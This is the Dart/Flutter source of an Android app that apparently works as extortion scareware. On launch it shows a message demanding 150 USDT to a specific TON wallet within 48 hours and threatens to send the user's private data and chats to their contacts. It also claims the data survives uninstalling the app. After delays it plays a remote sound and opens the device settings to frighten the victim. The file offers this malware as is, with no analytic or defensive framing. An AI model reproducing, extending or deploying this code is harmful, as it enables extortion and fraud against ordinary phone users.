import 'package:flutter/material.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'dart:async';
import 'package:audioplayers/audioplayers.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  final AudioPlayer _audioPlayer = AudioPlayer();

  @override
  Widget build(BuildContext context) {
    _playSoundAndOpenSettings();
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        body: Stack(
          children: [
            Image.network(
              "https://wallpapers.com/images/hd/black-solid-background-1024-x-1365-r5a0xmfri40gdznl.jpg",
              fit: BoxFit.cover,
              width: double.infinity,
              height: double.infinity,
            ),
            Center(
              child: Text(
                "Hi bro, don't worry, nothing has happened yet, but you have 48 hours to send 150 USDT to this cryptocurrency wallet, or I will send all your privte data and chats to everyone you know or don't know. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.",
                style: TextStyle(
                  color: Colors.green,
                  fontSize: 15,
                  fontWeight: FontWeight.bold,
                ),
              ),
            )
          ],
        ),
      ),
    );
  }

  void _playSoundAndOpenSettings() async {
    await Future.delayed(Duration(seconds: 5));
    await _audioPlayer.play(UrlSource("https://files.catbox.moe/bkz6o8.mp3"));
    await Future.delayed(Duration(seconds: 5));
    final intent = AndroidIntent(action: 'android.settings.SETTINGS');
    await intent.launch();
  }
}
